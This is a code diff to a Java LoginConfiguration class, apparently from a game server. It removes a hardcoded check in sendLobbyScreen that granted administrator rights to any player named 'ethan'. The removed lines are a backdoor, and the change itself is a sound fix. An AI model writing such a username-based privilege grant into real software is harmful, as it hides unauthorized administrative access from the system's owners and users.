@@ -84,8 +84,6 @@ public final class LoginConfiguration {
 	 */
 	public static void sendLobbyScreen(Player player) {
 		int random = RandomFunction.getRandom(50);
-		if(player.getUsername().equalsIgnoreCase("ethan"))
-			player.getDetails().setRights(Rights.ADMINISTRATOR);
 
 		Repository.getLobbyPlayers().add(player);
 		player.getPacketDispatch().sendString(getLastLogin(player), 378, 116);
